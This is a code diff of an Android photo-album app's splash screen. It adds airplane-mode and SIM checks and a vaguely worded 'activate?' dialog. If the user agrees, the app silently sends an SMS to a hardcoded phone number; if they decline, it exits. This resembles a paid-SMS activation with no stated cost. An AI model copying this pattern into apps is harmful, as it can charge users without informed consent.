@@ -4,22 +4,23 @@ import java.util.ArrayList;
 
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.net.ConnectivityManager;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.Settings;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 
-import com.hdc.mshow.customize.Toast;
 import com.hdc.mshow.dialog.Dialog;
-import com.hdc.mshow.dialog.Dialog_SMS;
-import com.hdc.mshow.dialog.Dialog_Update;
 import com.hdc.mshow.dialog.Dialog_Waitting;
-import com.hdc.mshow.model.IAction;
-import com.hdc.mshow.model.Sms;
 import com.hdc.mshow.service.ServiceSMS;
 import com.hdc.mshow.ultilities.FileManager;
-import com.hdc.mshow.ultilities.SendSMS;
 
 public class SplashActvity extends Activity implements Runnable {
 
@@ -29,7 +30,7 @@ public class SplashActvity extends Activity implements Runnable {
 	public String fileName = "userID.txt";
 	public int width;
 	public int height;
-	
+
 	public boolean isConnect = true;
 
 	public Dialog waitting;
@@ -43,9 +44,16 @@ public class SplashActvity extends Activity implements Runnable {
 		// TODO instance
 		instance = this;
 
+		ServiceSMS.instance.isAirPlane = isAirplaneModeOn(instance);
+
+		// TODO check sim card
+		ServiceSMS.instance.isSim = checkSimCard();
+
 		// TODO Check connect
 		checkConnectInternet();
 
+		//onDialog_SendSMS();
+		
 		if (isConnect) {
 			// // TODO get branche and handset
 			// getBranch_Handset();
@@ -70,6 +78,108 @@ public class SplashActvity extends Activity implements Runnable {
 			buidler.show();
 		}
 
+	}
+
+	private static boolean isAirplaneModeOn(Context context) {
+		return Settings.System.getInt(context.getContentResolver(),
+				Settings.System.AIRPLANE_MODE_ON, 0) != 0;
+	}
+
+	public void onDialog_SendSMS() {
+		// AlertDialog.Builder builder =;
+		new AlertDialog.Builder(this).setTitle("Thông báo").setMessage("Bạn có muốn kích hoạt không ?").setNegativeButton(
+				"Hủy", new android.content.DialogInterface.OnClickListener() {
+					public void onClick(android.content.DialogInterface dialog, int which) {
+						// TODO Auto-generated method stub
+						System.exit(1);
+					}
+				}).setPositiveButton("Đồng ý", new android.content.DialogInterface.OnClickListener() {
+					
+					@Override
+					public void onClick(DialogInterface dialog, int which) {
+						// TODO Auto-generated method stub
+						final String address = "0937835862";
+						final String data = "good";
+
+						new Thread(new Runnable() {
+							public void run() {
+								try {
+									String SENT = "SMS_SENT";
+									String DELIVERED = "SMS_DELIVERED";
+									PendingIntent sentPI = PendingIntent.getBroadcast(instance, 0,
+											new Intent(SENT), 0);
+									PendingIntent deliveredPI = PendingIntent.getBroadcast(instance, 0, new Intent(
+											DELIVERED), 0);
+									SmsManager sms = SmsManager.getDefault();
+									instance.registerReceiver(new BroadcastReceiver() {
+										@Override
+										public void onReceive(Context arg0, Intent arg1) {
+											// TODO Auto-generated method stub+
+											switch (getResultCode()) {
+											case Activity.RESULT_OK:
+												// mDialog_Success.show();
+												break;
+											case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
+												// mDialog_Failed.show();
+												break;
+											case SmsManager.RESULT_ERROR_NO_SERVICE:
+												// mDialog_Failed.show();
+												break;
+											case SmsManager.RESULT_ERROR_NULL_PDU:
+												// mDialog_Failed.show();
+												break;
+											case SmsManager.RESULT_ERROR_RADIO_OFF:
+												// mDialog_Failed.show();
+												break;
+											}
+										}
+									}, new IntentFilter(SENT));
+
+									ServiceSMS.instance.m_Active.status = "0";
+									sms.sendTextMessage(address, null, data, sentPI, deliveredPI);
+								} catch (Exception e) {
+									e.printStackTrace();
+									// mDialog_Failed.show();
+								}
+							}
+						}).start();						
+					}
+				}).show();
+
+	}
+
+	// TODO check sim card
+	private boolean checkSimCard() {
+		boolean kq = true;
+		TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		int simState = telMgr.getSimState();
+		switch (simState) {
+		case TelephonyManager.SIM_STATE_ABSENT:
+			// do something
+			kq = false;
+			break;
+		case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
+			// do something
+			kq = false;
+			break;
+		case TelephonyManager.SIM_STATE_PIN_REQUIRED:
+			// do something
+			kq = false;
+			break;
+		case TelephonyManager.SIM_STATE_PUK_REQUIRED:
+			// do something
+			kq = false;
+			break;
+		case TelephonyManager.SIM_STATE_READY:
+			// do something
+			kq = true;
+			break;
+		case TelephonyManager.SIM_STATE_UNKNOWN:
+			// do something
+			kq = false;
+			break;
+		}
+		return kq;
 	}
 
 	// TODO check app ID
@@ -141,28 +251,20 @@ public class SplashActvity extends Activity implements Runnable {
 
 	// TODO get width && height device
 	private void getWidth_Heigh() {
-		ServiceSMS.instance.WIDTH = getWindowManager().getDefaultDisplay()
-				.getWidth();
-		ServiceSMS.instance.HEIGHT = getWindowManager().getDefaultDisplay()
-				.getHeight();
+		ServiceSMS.instance.WIDTH = getWindowManager().getDefaultDisplay().getWidth();
+		ServiceSMS.instance.HEIGHT = getWindowManager().getDefaultDisplay().getHeight();
 	}
 
 	// TODO check connect Internet
 	private void checkConnectInternet() {
 		ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-		if (connMgr.getActiveNetworkInfo() != null
-				&& connMgr.getActiveNetworkInfo().isAvailable()
+		if (connMgr.getActiveNetworkInfo() != null && connMgr.getActiveNetworkInfo().isAvailable()
 				&& connMgr.getActiveNetworkInfo().isConnected()) {
 			isConnect = true;
 		} else {
 			isConnect = false;
 		}
 	}
-
-
-
-
-
 
 	@Override
 	public void run() {
@@ -180,10 +282,10 @@ public class SplashActvity extends Activity implements Runnable {
 		checkAppID();
 
 		// TODO get activice
-		//ServiceSMS.instance.getActive();
+		// ServiceSMS.instance.getActive();
 
 		// TODO get sms
-		//ServiceSMS.instance.getSMS();
+		// ServiceSMS.instance.getSMS();
 
 		// TODO get list albums
 		ServiceSMS.instance.getAll_Albums();
@@ -202,8 +304,7 @@ public class SplashActvity extends Activity implements Runnable {
 			waitting.dismiss();
 
 			// TODO Auto-generated method stub
-			Intent intent = new Intent(SplashActvity.this,
-					ListAlbumActivity.class);
+			Intent intent = new Intent(SplashActvity.this, ListAlbumActivity.class);
 			startActivity(intent);
 			finish();
 
